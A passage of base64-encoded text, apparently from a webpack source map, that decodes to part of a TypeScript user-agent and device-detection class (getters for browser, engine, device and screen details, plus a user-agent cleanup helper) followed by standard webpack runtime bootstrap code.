SB0aGlzO1xyXG4gICAgICAgICAvISpkZXZpY2VzIGxpc3QqIS9cclxuICAgICAgICAgdGhpcy5HZXRVcGRhdGVkRGF0YShcImh0dHA6Ly9sb2NhbGhvc3QvbGlicmFyaWVzL2pzb24vYnJvd3Nlci1kZXZpY2VzLWxpc3QuanNvblwiLCBmdW5jdGlvbiAodXBkYXRlZExpc3Q6IGFueSkge1xyXG4gICAgICAgICAgICBzZWxmLmRldmljZXNMaXN0ID0gdXBkYXRlZExpc3Q7XHJcbiAgICAgICAgfSk7XHJcbiAgICAgICAgIC8hKmRldmljZSdzIGFyY2hpdGVjdHVyZSBsaXN0KiEvXHJcbiAgICAgICAgIHRoaXMuR2V0VXBkYXRlZERhdGEoXCJodHRwOi8vbG9jYWxob3N0L2xpYnJhcmllcy9qc29uL2Jyb3dzZXItZGV2aWNlcy1hcmNoaXRlY3R1cmUtbGlzdC5qc29uXCIsIGZ1bmN0aW9uICh1cGRhdGVkTGlzdDogYW55KSB7XHJcbiAgICAgICAgICAgIHNlbGYuZGV2aWNlc0FyY2hpdGVjdHVyZUxpc3QgPSB1cGRhdGVkTGlzdDtcclxuICAgICAgICB9KTtcclxuICAgICAgICAgLyEqZGV2aWNlcyBjYXRlZ29yeSBsaXN0KiEvXHJcbiAgICAgICAgIHRoaXMuR2V0VXBkYXRlZERhdGEoXCJodHRwOi8vbG9jYWxob3N0L2xpYnJhcmllcy9qc29uL2Jyb3dzZXItZGV2aWNlcy1jYXRlZ29yeS1saXN0Lmpzb25cIiwgZnVuY3Rpb24gKHVwZGF0ZWRMaXN0OiBhbnkpIHtcclxuICAgICAgICAgICAgc2VsZi5kZXZpY2VzQ2F0ZWdvcnlMaXN0ID0gdXBkYXRlZExpc3Q7XHJcbiAgICAgICAgfSk7XHJcbiAgICAgICAgIC8hKmRldmljZXMgcGxhdGZvcm0gd2luZG93IG1hbmFnZXIgbGlzdCohL1xyXG4gICAgICAgICB0aGlzLkdldFVwZGF0ZWREYXRhKFwiaHR0cDovL2xvY2FsaG9zdC9saWJyYXJpZXMvanNvbi9icm93c2VyLWRldmljZXMtcGxhdGZvcm0td21uLWxpc3QuanNvblwiLCBmdW5jdGlvbiAodXBkYXRlZExpc3Q6IGFueSkge1xyXG4gICAgICAgICAgICBzZWxmLmRldmljZXNQbGF0Zm9ybVdNTmFtZUxpc3QgPSB1cGRhdGVkTGlzdDtcclxuICAgICAgICB9KTtcclxuICAgICAgICAgLyEqYnJvd3NlcnMgbGlzdCohL1xyXG4gICAgICAgICB0aGlzLkdldFVwZGF0ZWREYXRhKFwiaHR0cDovL2xvY2FsaG9zdC9saWJyYXJpZXMvanNvbi9icm93c2VyLWFsbC1saXN0Lmpzb25cIiwgZnVuY3Rpb24gKHVwZGF0ZWRMaXN0OiBhbnkpIHtcclxuICAgICAgICAgICAgc2VsZi53ZWJCcm93c2VyTGlzdCA9IHVwZGF0ZWRMaXN0O1xyXG4gICAgICAgIH0pO1xyXG4gICAgICAgICAvISpicm93c2VycyBhcHAgY29kZSBsaXN0KiEvXHJcbiAgICAgICAgIHRoaXMuR2V0VXBkYXRlZERhdGEoXCJodHRwOi8vbG9jYWxob3N0L2xpYnJhcmllcy9qc29uL2Jyb3dzZXItYXBwLWNvZGUtbGlzdC5qc29uXCIsIGZ1bmN0aW9uICh1cGRhdGVkTGlzdDogYW55KSB7XHJcbiAgICAgICAgICAgIHNlbGYud2ViQnJvd3NlckFwcENvZGVOYW1lTGlzdCA9IHVwZGF0ZWRMaXN0O1xyXG4gICAgICAgIH0pO1xyXG4gICAgICAgICAvISpicm93c2VycyBsYXlvdXQgbGlzdCohL1xyXG4gICAgICAgICB0aGlzLkdldFVwZGF0ZWREYXRhKFwiaHR0cDovL2xvY2FsaG9zdC9saWJyYXJpZXMvanNvbi9icm93c2VyLWxheW91dC1saXN0Lmpzb25cIiwgZnVuY3Rpb24gKHVwZGF0ZWRMaXN0OiBhbnkpIHtcclxuICAgICAgICAgICAgc2VsZi53ZWJCcm93c2VyQXBwQ29kZU5hbWVMaXN0ID0gdXBkYXRlZExpc3Q7XHJcbiAgICAgICAgfSk7Ki9cclxuXHJcbiAgICAgICAgdGhpcy5hbmFseXplKCk7XHJcblxyXG4gICAgfVxyXG5cclxuXHJcbiAgICAvKnByaXZhdGUgR2V0VXBkYXRlZERhdGEoVXJsOiBzdHJpbmcsIGNhbGxiYWNrOiBhbnkpIHtcclxuICAgICAgICBzZW5kUmVxdWVzdCh7XHJcbiAgICAgICAgICAgIG1ldGhvZDogXCJQT1NUXCIsXHJcbiAgICAgICAgICAgIHVybDogVXJsLFxyXG4gICAgICAgICAgICBhc3luYzogdHJ1ZSxcclxuICAgICAgICB9LCBmdW5jdGlvbiAoZGF0YTogYW55KSB7XHJcbiAgICAgICAgICAgIHRyeSB7XHJcbiAgICAgICAgICAgICAgICBpZiAoSlNPTi5wYXJzZShkYXRhKSkge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhKU09OLnBhcnNlKGRhdGEpKTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcclxuICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoXCJVbmFibGUgdG8gcmV0cmlldmUgZGF0YSBmcm9tIFwiICsgVXJsKTtcclxuICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoZSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9KTtcclxuICAgIH0qL1xyXG5cclxuXHJcbiAgICBwcml2YXRlIGFuYWx5emUoKSB7XHJcbiAgICAgICAgLypzdGFydCBvcGVyYXRpb24qL1xyXG4gICAgICAgIGNvbnN0IHNlbGYgPSB0aGlzO1xyXG4gICAgICAgIGxldCBjbGVhblVBID0gc2VsZi5jbGVhblVzZXJBZ2VudFN0cmluZyh0aGlzLlVzZXJBZ2VudCk7XHJcbiAgICAgICAgLypmaXJzdCBzdGVwKi9cclxuICAgICAgICBpZiAoQXJyYXkuaXNBcnJheShzZWxmLndlYkJyb3dzZXJBcHBDb2RlTmFtZUxpc3QpKSB7XHJcbiAgICAgICAgICAgIHNlbGYud2ViQnJvd3NlckFwcENvZGVOYW1lTGlzdC5mb3JFYWNoKCh2YWx1ZTogYW55KSA9PiB7XHJcbiAgICAgICAgICAgICAgICAvKnNlYXJjaCBhcHAgY29kZSBmb3JtIHVzZXItYWdlbnQqL1xyXG4gICAgICAgICAgICAgICAgaWYgKGNsZWFuVUEuaW5kZXhPZih2YWx1ZS5uYW1lLnRvTG93ZXJDYXNlKCkpICE9PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuYnJvd3NlckFwcE5hbWUgPSB2YWx1ZS5jb2RlO1xyXG4gICAgICAgICAgICAgICAgICAgIC8qc3BsaXQgdXNlci1hZ2VudCBpbiB0byBhcnJheSBieSBzcGFjZSovXHJcbiAgICAgICAgICAgICAgICAgICAgY2xlYW5VQS5zcGxpdChcIiBcIikuZm9yRWFjaChmdW5jdGlvbiAoaXRlbSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoaXRlbS5pbmRleE9mKHZhbHVlLm5hbWUudG9Mb3dlckNhc2UoKSkgIT09IC0xKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmJyb3dzZXJBcHBOYW1lRnVsbCA9IGl0ZW0ucmVwbGFjZShcIi9cIiwgXCIgXCIpLnJlcGxhY2UodmFsdWUubmFtZSwgdmFsdWUuY29kZSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhzZWxmLmJyb3dzZXJBcHBOYW1lRnVsbCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmJyb3dzZXJBcHBWZXJzaW9uID0gaXRlbS5zdWJzdHIodmFsdWUubmFtZS50b0xvd2VyQ2FzZSgpLmxlbmd0aCArIDEsIChpdGVtLmxlbmd0aCAtICh2YWx1ZS5uYW1lLnRvTG93ZXJDYXNlKCkubGVuZ3RoICsgMSkpKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKHNlbGYuYnJvd3NlckFwcFZlcnNpb24pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0pO1xyXG4gICAgICAgIH1cclxuXHJcblxyXG4gICAgICAgIC8qc2Vjb25kIHN0ZXAqL1xyXG4gICAgICAgIC8qc2VsZi5kZXZpY2VzUGxhdGZvcm1XTU5hbWVMaXN0LmZvckVhY2goZnVuY3Rpb24gKHdtOmFueSl7XHJcblxyXG4gICAgICAgIH0pKi9cclxuXHJcblxyXG4gICAgfVxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHB1YmxpY1xyXG4gICAgICogQHJldHVybiBzdHJpbmdcclxuICAgICAqL1xyXG4gICAgZ2V0VVJMUHJvdG9jb2woKTogc3RyaW5nIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5VUkxQcm90b2NvbDtcclxuICAgIH1cclxuXHJcbiAgICAvKipcclxuICAgICAqIEBwdWJsaWNcclxuICAgICAqIEByZXR1cm4gc3RyaW5nXHJcbiAgICAgKi9cclxuICAgIGdldFVSTEhvc3RuYW1lKCk6IHN0cmluZyB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuVVJMSG9zdG5hbWU7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqXHJcbiAgICAgKiBAcHVibGljXHJcbiAgICAgKiBAcmV0dXJuIHN0cmluZ1xyXG4gICAgICovXHJcbiAgICBnZXRVUkxQYXRoKCk6IHN0cmluZyB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuVVJMUGF0aDtcclxuICAgIH1cclxuXHJcbiAgICAvKipcclxuICAgICAqIEBwdWJsaWNcclxuICAgICAqIEByZXR1cm4gc3RyaW5nXHJcbiAgICAgKi9cclxuICAgIGdldFVSTFBhdGhGdWxsKCk6IHN0cmluZyB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuVVJMUGF0aEZ1bGw7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHB1YmxpY1xyXG4gICAgICogQHJldHVybiBudW1iZXJcclxuICAgICAqL1xyXG4gICAgZ2VyRGV2aWNlU2NyZWVuSGVpZ2h0KCk6IG51bWJlciB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuRGV2aWNlU2NyZWVuSGVpZ2h0O1xyXG4gICAgfVxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHB1YmxpY1xyXG4gICAgICogQHJldHVybiBudW1iZXJcclxuICAgICAqL1xyXG4gICAgZ2VyRGV2aWNlU2NyZWVuV2lkdGgoKTogbnVtYmVyIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5EZXZpY2VTY3JlZW5XaWR0aDtcclxuICAgIH1cclxuXHJcbiAgICAvKipcclxuICAgICAqIEBwdWJsaWNcclxuICAgICAqIEByZXR1cm4gbnVtYmVyXHJcbiAgICAgKi9cclxuICAgIGdlckRldmljZVNjcmVlbkNvbG9yRGVwdGgoKTogbnVtYmVyIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5EZXZpY2VTY3JlZW5Db2xvckRlcHRoO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHB1YmxpY1xyXG4gICAgICogQHJldHVybiBudW1iZXJcclxuICAgICAqL1xyXG4gICAgZ2VyRGV2aWNlU2NyZWVuUGl4ZWxEZXB0aCgpOiBudW1iZXIge1xyXG4gICAgICAgIHJldHVybiB0aGlzLkRldmljZVNjcmVlblBpeGVsRGVwdGg7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHB1YmxpY1xyXG4gICAgICogQHJldHVybiBzdHJpbmdcclxuICAgICAqL1xyXG4gICAgZ2V0RGV2aWNlV21OYW1lT3JpZ2luYWwoKTogc3RyaW5nIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5kZXZpY2VXbU5hbWVPcmlnaW5hbDtcclxuICAgIH1cclxuXHJcbiAgICAvKipcclxuICAgICAqIEBwdWJsaWNcclxuICAgICAqIEByZXR1cm4gYXJyYXlcclxuICAgICAqL1xyXG4gICAgZ2V0RGV2aWNlSW5mb0FsbCgpOiBhbnkge1xyXG4gICAgICAgIHJldHVybiB0aGlzLmRldmljZUluZm9BbGw7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqXHJcbiAgICAgKiBAcHVibGljXHJcbiAgICAgKiBAcmV0dXJuIG1peGVkXHJcbiAgICAgKi9cclxuICAgIGdldFVzZXJBZ2VudCgpIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5Vc2VyQWdlbnQ7XHJcbiAgICB9XHJcblxyXG4gICAgZ2V0RGV2aWNlTGlzdCgpIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5kZXZpY2VzTGlzdDtcclxuICAgIH1cclxuXHJcbiAgICBnZXRBcmNoaXRlY3R1cmVMaXN0KCkge1xyXG4gICAgICAgIHJldHVybiB0aGlzLmRldmljZXNBcmNoaXRlY3R1cmVMaXN0O1xyXG4gICAgfVxyXG5cclxuICAgIGdldEJyb3dzZXJBcHBDb2RlTmFtZUxpc3QoKSB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMud2ViQnJvd3NlckFwcENvZGVOYW1lTGlzdDtcclxuICAgIH1cclxuXHJcbiAgICBnZXRXZWJCcm93c2VyTGlzdCgpIHtcclxuICAgICAgICByZXR1cm4gdGhpcy53ZWJCcm93c2VyTGlzdDtcclxuICAgIH1cclxuXHJcbiAgICBnZXRXZWJCcm93c2VyTGF5b3V0TGlzdCgpIHtcclxuICAgICAgICByZXR1cm4gdGhpcy53ZWJCcm93c2VyTGF5b3V0TGlzdDtcclxuICAgIH1cclxuXHJcbiAgICBnZXRQbGF0Zm9ybVdNTmFtZUxpc3QoKSB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuZGV2aWNlc1BsYXRmb3JtV01OYW1lTGlzdDtcclxuICAgIH1cclxuXHJcbiAgICBnZXREZXZpY2VzQ2F0ZWdvcnlMaXN0KCkge1xyXG4gICAgICAgIHJldHVybiB0aGlzLmRldmljZXNDYXRlZ29yeUxpc3Q7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHB1YmxpY1xyXG4gICAgICogQHJldHVybiBhcnJheVxyXG4gICAgICovXHJcbiAgICBnZXRVc2VyQWdlbnRMaXN0KCk6IGFueSB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuVXNlckFnZW50TGlzdDtcclxuICAgIH1cclxuXHJcblxyXG4gICAgLyoqXHJcbiAgICAgKiBAcHVibGljXHJcbiAgICAgKiBAcmV0dXJuIHN0cmluZ1xyXG4gICAgICovXHJcbiAgICBnZXRCcm93c2VyRW5naW5lTmFtZSgpOiBzdHJpbmcge1xyXG4gICAgICAgIHJldHVybiAodGhpcy5icm93c2VyRW5naW5lTmFtZSkudHJpbSgpO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHB1YmxpY1xyXG4gICAgICogQHJldHVybiBzdHJpbmdcclxuICAgICAqL1xyXG4gICAgZ2V0QnJvd3NlckVuZ2luZU5hbWVGdWxsKCk6IHN0cmluZyB7XHJcbiAgICAgICAgcmV0dXJuICh0aGlzLmJyb3dzZXJFbmdpbmVOYW1lRnVsbCkudHJpbSgpO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHB1YmxpY1xyXG4gICAgICogQHJldHVybiBhcnJheVxyXG4gICAgICovXHJcbiAgICBnZXRCcm93c2VySW5mb0FsbCgpOiBhbnkge1xyXG4gICAgICAgIHJldHVybiB0aGlzLmJyb3dzZXJJbmZvQWxsO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICAvKipcclxuICAgICAqIEBwdWJsaWNcclxuICAgICAqIEByZXR1cm4gc3RyaW5nXHJcbiAgICAgKi9cclxuICAgIGdldEJyb3dzZXJBcHBDb2RlTmFtZSgpOiBzdHJpbmcge1xyXG4gICAgICAgIHJldHVybiAodGhpcy5icm93c2VyQXBwQ29kZU5hbWUpLnRyaW0oKTtcclxuICAgIH1cclxuXHJcbiAgICAvKipcclxuICAgICAqIEBwdWJsaWNcclxuICAgICAqIEByZXR1cm4gc3RyaW5nXHJcbiAgICAgKi9cclxuICAgIGdldEJyb3dzZXJBcHBDb2RlVmVyc2lvbigpOiBzdHJpbmcge1xyXG4gICAgICAgIHJldHVybiAodGhpcy5icm93c2VyQXBwQ29kZVZlcnNpb24pLnRyaW0oKTtcclxuICAgIH1cclxuXHJcbiAgICAvKipcclxuICAgICAqIEBwdWJsaWNcclxuICAgICAqIEByZXR1cm4gc3RyaW5nXHJcbiAgICAgKi9cclxuICAgIGdldEJyb3dzZXJBcHBOYW1lKCk6IHN0cmluZyB7XHJcbiAgICAgICAgcmV0dXJuICh0aGlzLmJyb3dzZXJBcHBOYW1lKS50cmltKCk7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqXHJcbiAgICAgKiBAcHVibGljXHJcbiAgICAgKiBAcmV0dXJuIHN0cmluZ1xyXG4gICAgICovXHJcbiAgICBnZXRCcm93c2VyQXBwQ29kZU5hbWVGdWxsKCk6c3RyaW5nIHtcclxuICAgICAgICByZXR1cm4gKHRoaXMuYnJvd3NlckFwcE5hbWUpLnRyaW0oKTtcclxuICAgIH1cclxuXHJcbiAgICAvKipcclxuICAgICAqIEBwdWJsaWNcclxuICAgICAqIEByZXR1cm4gc3RyaW5nXHJcbiAgICAgKi9cclxuICAgIGdldEJyb3dzZXJBcHBWZXJzaW9uKCk6IHN0cmluZyB7XHJcbiAgICAgICAgcmV0dXJuICh0aGlzLmJyb3dzZXJBcHBWZXJzaW9uKS50cmltKCk7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqXHJcbiAgICAgKiBAcHVibGljXHJcbiAgICAgKiBAcmV0dXJuIHN0cmluZ1xyXG4gICAgICovXHJcbiAgICBnZXRCcm93c2VyQXJjaGl0ZWN0dXJlKCk6IHN0cmluZyB7XHJcbiAgICAgICAgcmV0dXJuICh0aGlzLmJyb3dzZXJBcmNoaXRlY3R1cmUpLnRyaW0oKTtcclxuICAgIH1cclxuXHJcblxyXG4gICAgLyoqXHJcbiAgICAgKiBAcHVibGljXHJcbiAgICAgKiBAcmV0dXJuIHN0cmluZ1xyXG4gICAgICovXHJcbiAgICBnZXRCcm93c2VyRW5naW5lVmVyc2lvbigpOiBzdHJpbmcge1xyXG4gICAgICAgIHJldHVybiAodGhpcy5icm93c2VyRW5naW5lVmVyc2lvbikudHJpbSgpO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHB1YmxpY1xyXG4gICAgICogQHJldHVybiBzdHJpbmdcclxuICAgICAqL1xyXG4gICAgZ2V0QnJvd3Nlck5hbWUoKTogc3RyaW5nIHtcclxuICAgICAgICByZXR1cm4gKHRoaXMuYnJvd3Nlck5hbWUpLnRyaW0oKTtcclxuICAgIH1cclxuXHJcblxyXG4gICAgZ2V0QnJvd3Nlck5hbWVGdWxsKCk6IHN0cmluZyB7XHJcbiAgICAgICAgcmV0dXJuICh0aGlzLmJyb3dzZXJOYW1lRnVsbCkudHJpbSgpO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICAvKipcclxuICAgICAqIEBwdWJsaWNcclxuICAgICAqIEByZXR1cm4gc3RyaW5nXHJcbiAgICAgKi9cclxuICAgIGdldEJyb3dzZXJWZXJzaW9uKCk6IHN0cmluZyB7XHJcbiAgICAgICAgcmV0dXJuICh0aGlzLmJyb3dzZXJWZXJzaW9uKS50cmltKCk7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqXHJcbiAgICAgKiBAcHVibGljXHJcbiAgICAgKiBAcmV0dXJuIHN0cmluZ1xyXG4gICAgICovXHJcbiAgICBnZXRCcm93c2VyVmVyc2lvbkZ1bGwoKTogc3RyaW5nIHtcclxuICAgICAgICByZXR1cm4gKHRoaXMuYnJvd3NlclZlcnNpb25GdWxsKS50cmltKCk7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqXHJcbiAgICAgKiBAcHVibGljXHJcbiAgICAgKiBAcmV0dXJuIG1peGVkXHJcbiAgICAgKi9cclxuICAgIGdldEN1cnJlbnREZXZpY2VJbmZvKCkge1xyXG4gICAgICAgIHJldHVybiB0aGlzLmN1cnJlbnREZXZpY2VJbmZvO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHB1YmxpY1xyXG4gICAgICogQHJldHVybiBzdHJpbmdcclxuICAgICAqL1xyXG4gICAgZ2V0RGV2aWNlTmFtZSgpOiBzdHJpbmcge1xyXG4gICAgICAgIHJldHVybiAodGhpcy5kZXZpY2VOYW1lKS50cmltKCk7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqXHJcbiAgICAgKiBAcHVibGljXHJcbiAgICAgKiBAcmV0dXJuIHN0cmluZ1xyXG4gICAgICovXHJcbiAgICBnZXREZXZpY2VOYW1lRnVsbCgpOiBzdHJpbmcge1xyXG4gICAgICAgIHJldHVybiAodGhpcy5kZXZpY2VOYW1lRnVsbCkudHJpbSgpO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHB1YmxpY1xyXG4gICAgICogQHJldHVybiBzdHJpbmdcclxuICAgICAqL1xyXG4gICAgZ2V0RGV2aWNlTmFtZU9yaWdpbmFsKCk6IHN0cmluZyB7XHJcbiAgICAgICAgcmV0dXJuICh0aGlzLmRldmljZU5hbWVPcmlnaW5hbCkudHJpbSgpO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICAvKipcclxuICAgICAqIEBwdWJsaWNcclxuICAgICAqIEByZXR1cm4gc3RyaW5nXHJcbiAgICAgKi9cclxuICAgIGdldERldmljZVR5cGUoKTogc3RyaW5nIHtcclxuICAgICAgICByZXR1cm4gKHRoaXMuZGV2aWNlVHlwZSkudHJpbSgpO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHB1YmxpY1xyXG4gICAgICogQHJldHVybiBzdHJpbmdcclxuICAgICAqL1xyXG4gICAgZ2V0RGV2aWNlQXJjaGl0ZWN0dXJlKCk6IHN0cmluZyB7XHJcbiAgICAgICAgcmV0dXJuICh0aGlzLmRldmljZUFyY2hpdGVjdHVyZSkudHJpbSgpO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHB1YmxpY1xyXG4gICAgICogQHJldHVybiBzdHJpbmdcclxuICAgICAqL1xyXG4gICAgZ2V0RGV2aWNlV2luZG93TWFuYWdlcigpOiBzdHJpbmcge1xyXG4gICAgICAgIHJldHVybiAodGhpcy5kZXZpY2VXaW5kb3dNYW5hZ2VyKS50cmltKCk7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIGd0RGV2aWNlRGV0YWlscyhyZXNvdXJjZXM6IGFueSkge1xyXG4gICAgICAgIC8vYXJyYXlfY2hhbmdlX2tleV9jYXNlKCRhZ2UsQ0FTRV9VUFBFUilcclxuICAgICAgICBpZiAoQXJyYXkuaXNBcnJheShyZXNvdXJjZXMpICYmIChyZXNvdXJjZXMpLmxlbmd0aCA+IDApIHtcclxuICAgICAgICAgICAgaWYgKCdQbGF0Zm9ybScgaW4gcmVzb3VyY2VzKSB7XHJcbiAgICAgICAgICAgICAgICB0aGlzLmN1cnJlbnREZXZpY2VJbmZvID0gcmVzb3VyY2VzWydQbGF0Zm9ybSddO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5kZXZpY2VOYW1lID0gcmVzb3VyY2VzWydQbGF0Zm9ybSddWyduYW1lJ107XHJcbiAgICAgICAgICAgICAgICB0aGlzLmRldmljZUFyY2hpdGVjdHVyZSA9IHJlc291cmNlc1snUGxhdGZvcm0nXVsnYXJjaGl0ZWN0dXJlJ107XHJcbiAgICAgICAgICAgICAgICB0aGlzLmRldmljZVR5cGUgPSByZXNvdXJjZXNbJ0RldmljZSddWyd0eXBlJ107XHJcbiAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICBpZiAodHlwZW9mIHJlc291cmNlcyA9PT0gJ3N0cmluZycpIHtcclxuICAgICAgICAgICAgICAgICAgICB0aGlzLmRldmljZU5hbWUgPSByZXNvdXJjZXM7XHJcbiAgICAgICAgICAgICAgICAgICAgdGhpcy5kZXZpY2VUeXBlID0gcmVzb3VyY2VzO1xyXG4gICAgICAgICAgICAgICAgICAgIHRoaXMuY3VycmVudERldmljZUluZm8gPSByZXNvdXJjZXM7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG5cclxuICAgIGdldFBsYXRmb3JtTmFtZSgpIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5kZXZpY2VOYW1lO1xyXG4gICAgfVxyXG5cclxuICAgIGdldFBsYXRmb3JtQXJjaGl0ZWN0dXJlKCkge1xyXG4gICAgICAgIHJldHVybiB0aGlzLmRldmljZUFyY2hpdGVjdHVyZTtcclxuICAgIH1cclxuXHJcbiAgICBwcml2YXRlIGNsZWFuVXNlckFnZW50U3RyaW5nKFVzZXJBZ2VudDogc3RyaW5nKTpzdHJpbmcge1xyXG4gICAgICAgIC8vIGNsZWFuIHVwIHRoZSBzdHJpbmdcclxuICAgICAgICAvLyByZXBsYWNlIGJyb3dzZXIgbmFtZXMgd2l0aCB0aGVpciBhbGlhc2VzXHJcbiAgICAgICAgcmV0dXJuIFVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpLnRyaW0oKS5yZXBsYWNlKCdvcHInLCAnb3BlcmEnKS5yZXBsYWNlKCdpY2V3ZWFzZWwnLCAnZmlyZWZveCcpO1xyXG4gICAgfVxyXG59IiwiLy8gVGhlIG1vZHVsZSBjYWNoZVxudmFyIF9fd2VicGFja19tb2R1bGVfY2FjaGVfXyA9IHt9O1xuXG4vLyBUaGUgcmVxdWlyZSBmdW5jdGlvblxuZnVuY3Rpb24gX193ZWJwYWNrX3JlcXVpcmVfXyhtb2R1bGVJZCkge1xuXHQvLyBDaGVjayBpZiBtb2R1bGUgaXMgaW4gY2FjaGVcblx0dmFyIGNhY2hlZE1vZHVsZSA9IF9fd2VicGFja19tb2R1bGVfY2FjaGVfX1ttb2R1bGVJZF07XG5cdGlmIChjYWNoZWRNb2R1bGUgIT09IHVuZGVmaW5lZCkge1xuXHRcdHJldHVybiBjYWNoZWRNb2R1bGUuZXhwb3J0cztcblx0fVxuXHQvLyBDcmVhdGUgYSBuZXcgbW9kdWxlIChhbmQgcHV0IGl0IGludG8gdGhlIGNhY2hlKVxuXHR2YXIgbW9kdWxlID0gX193ZWJwYWNrX21vZHVsZV9jYWNoZV9fW21vZHVsZUlkXSA9IHtcblx0XHQvLyBubyBtb2R1bGUuaWQgbmVlZGVkXG5cdFx0Ly8gbm8gbW9kdWxlLmxvYWRlZCBuZWVkZWRcblx0XHRleHBvcnRzOiB7fVxuXHR9O1xuXG5cdC8vIEV4ZWN1dGUgdGhlIG1vZHVsZSBmdW5jdGlvblxuXHRfX3dlYnBhY2tfbW9kdWxlc19fW21vZHVsZUlkXShtb2R1bGUsIG1vZHVsZS5leHBvcnRzLCBfX3dlYnBhY2tfcmVxdWlyZV9fKTtcblxuXHQvLyBSZXR1cm4gdGhlIGV4cG9ydHMgb2YgdGhlIG1vZHVsZVxuXHRyZXR1cm4gbW9kdWxlLmV4cG9ydHM7XG59XG5cbiIsIi8vIGRlZmluZSBnZXR0ZXIgZnVuY3Rpb25zIGZvciBoYXJtb255IGV4cG9ydHNcbl9fd2VicGFja19yZXF1aXJlX18uZCA9IGZ1bmN0aW9uKGV4cG9ydHMsIGRlZmluaXRpb24pIHtcblx0Zm9yKHZhciBrZXkgaW4gZGVmaW5pdGlvbikge1xuXHRcdGlmKF9fd2VicGFja19yZXF1aXJlX18ubyhkZWZpbml0aW9uLCBrZXkpICYmICFfX3dlYnBhY2tfcmVxdWlyZV9fLm8oZXhwb3J0cywga2V5KSkge1xuXHRcdFx0T2JqZWN0LmRlZmluZVByb3BlcnR5KGV4cG9ydHMsIGtleSwgeyBlbnVtZXJhYmxlOiB0cnVlLCBnZXQ6IGRlZmluaXRpb25ba2V5XSB9KTtcblx0XHR9XG5cdH1cbn07IiwiX193ZWJwYWNrX3JlcXVpcmVfXy5vID0gZnVuY3Rpb24ob2JqLCBwcm9wKSB7IHJldHVybiBPYmplY3QucHJvdG90eXBlLmhhc093blByb3BlcnR5LmNhbGwob2JqLCBwcm9wKTsgfSIsIi8vIGRlZmluZSBfX2VzTW9kdWxlIG9uIGV4cG9ydHNcbl9fd2VicGFja19yZXF1aXJlX18uciA9IGZ1bmN0aW9uKGV4cG9ydHMpIHtcblx0aWYodHlwZW9mIFN5bWJvbCAhPT0gJ3VuZGVmaW5lZCcgJiYgU3ltYm9sLnRvU3RyaW5nVGFnKSB7XG5cdFx0T2JqZWN0LmRlZmluZVByb3BlcnR5KGV4cG9ydHMsIFN5bWJvbC50b1N0cmluZ1RhZywgeyB2YWx1ZTogJ01vZHVsZScgfSk7XG5cdH1cblx0T2JqZWN0LmRlZmluZVByb3BlcnR5KGV4cG9ydHMsICdfX2VzTW9kdWxlJywgeyB2YWx1ZTogdHJ1ZSB9KTtcbn0